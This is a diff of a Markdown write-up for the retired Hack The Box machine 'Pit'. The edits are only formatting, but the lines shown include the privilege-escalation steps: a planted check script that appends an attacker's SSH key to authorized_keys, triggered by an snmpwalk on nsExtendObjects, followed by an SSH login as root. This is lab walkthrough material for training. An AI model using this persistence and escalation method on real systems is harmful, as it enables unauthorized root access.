@@ -19,8 +19,9 @@ Hello guys!
 
 This week's machine will be **Pit**, another medium-rated Linux box from [Hack The Box](https://www.hackthebox.eu/), created by [polarbearer](https://app.hackthebox.eu/users/159204) and [GibParadox](https://app.hackthebox.eu/users/125033).
 
-\:information\_source: **Info**: Write-ups for Hack The Box machines are posted as soon as they’re retired.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups for Hack The Box machines are posted as soon as they're retired.
+</Alert>
 
 ![HTB Pit](https://i.imgur.com/pFwxqgv.png)
 
@@ -392,7 +393,7 @@ As we have the database credentials, remembered that we have access to the cockp
 Accessing the terminal from the web portal, was able to get the `user.txt` hash
 
 ```bash
-[michelle@pit ~]$ ls 
+[michelle@pit ~]$ ls
 check.sh  user.txt
 [michelle@pit ~]$ cat user.txt
 <redacted>
@@ -410,7 +411,7 @@ USER   root      rwx
 user   michelle  -wx
 GROUP  root      rwx
 mask             rwx
-other            ---                  
+other            ---
 ```
 
 Inspecting this file, noticed that's actually a directory but we don't have read access on (just write and execute according to above output). Searching for other files that makes reference to this folder, ran a recusive `grep` in the file system, where I have found a file previously found in `snmpwalk` enum..
@@ -418,7 +419,7 @@ Inspecting this file, noticed that's actually a directory but we don't have read
 ```bash
 [michelle@pit local]$ grep -r "/usr/local/monitoring/"  / 2>/dev/null
 /usr/bin/monitor:for script in /usr/local/monitoring/check*sh
-[michelle@pit local]$ cat /usr/bin/monitor 
+[michelle@pit local]$ cat /usr/bin/monitor
 #!/bin/bash
 
 for script in /usr/local/monitoring/check*sh
@@ -442,21 +443,21 @@ According to this guide [SNMP RCE - HackTricks](https://book.hacktricks.xyz/pent
 
 Based on the gathered information, we probably have a way to gain `root`access, where the following steps were executed:
 
-* Created a `checkXXXX.sh` file, which adds a public key inside ssh's `authorized_keys` in the profile that runs the process and copied it to `/usr/bin/monitor`.
+- Created a `checkXXXX.sh` file, which adds a public key inside ssh's `authorized_keys` in the profile that runs the process and copied it to `/usr/bin/monitor`.
 
 ```bash
 #!/bin/bash
 echo "ssh-rsa <base64PubKey> root@kali" >> ~/.ssh/authorized_keys
 ```
 
-* From the attacker machine, triggered the nsExtendedObject action
+- From the attacker machine, triggered the nsExtendedObject action
 
 ```bash
 # Trigger Extended objects
 snmpwalk -v 1 -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
 ```
 
-* Right after that, connected using the corresponding private key via SSH as user `root`, where I was able to get the final flag
+- Right after that, connected using the corresponding private key via SSH as user `root`, where I was able to get the final flag
 
 ```bash
 $ ssh -i pit root@10.10.10.241
